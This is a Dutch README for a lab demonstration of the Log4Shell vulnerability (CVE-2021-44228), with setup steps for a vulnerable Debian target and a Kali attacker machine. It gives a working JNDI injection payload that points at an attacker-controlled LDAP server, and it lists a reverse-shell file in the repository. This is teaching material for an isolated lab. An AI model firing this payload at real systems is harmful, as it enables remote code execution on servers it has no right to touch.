# Log4Shell Demonstratie (CVE-2021-44228)

Deze demo toont hoe de Log4Shell-kwetsbaarheid werkt door een gesplitste omgeving op te zetten met een **target machine (Debian)** en een **attacker machine (Kali Linux)**.

---

## 🖥️ Target VM (Debian)
Bevat de kwetsbare Java-webapp met Log4j 2.14.1.

### Vereisten:
- Debian/Ubuntu
- Java JDK

### Stappen:
```bash
sudo apt update && sudo apt install -y default-jdk wget
git clone https://github.com/SanderSchepers1993/CyberSec25.git
cd CyberSec25/scripts
chmod +x setup_target.sh
./setup_target.sh
```

Bezoek de webapp op: [http://<target-ip>:8080](http://<target-ip>:8080)

---

## ⚔️ Attacker VM (Kali)
Start een LDAP- en HTTP-server om een exploit via JNDI te leveren.

### Vereisten:
- Kali Linux
- Java JDK
- Python3

### Stappen:
```bash
sudo apt update && sudo apt install -y default-jdk python3 wget
git clone https://github.com/SanderSchepers1993/CyberSec25.git
cd CyberSec25/scripts
chmod +x setup_attacker.sh
./setup_attacker.sh
```

Gebruik de volgende payload in het formulier op de target:
```text
${jndi:ldap://<attacker-ip>:1389/a}
```

De exploit zal nu uitgevoerd zijn.
Exploit = touch /tmp/HACKED.txt

---

## 📁 Structuur
```
CyberSec25/
├── exploit/         # Exploit.java + reverse-shell.txt
├── ldap/            # LDAPServer.java (UnboundID)
├── webapp/          # Jetty + Log4j kwetsbare app
├── scripts/
│   ├── setup_target.sh
│   └── setup_attacker.sh
├── log4j2.xml
└── test_payload.txt
```

## ⚠️ Disclaimer
Gebruik dit enkel in een veilige testomgeving. De auteur is niet verantwoordelijk voor verkeerd gebruik.
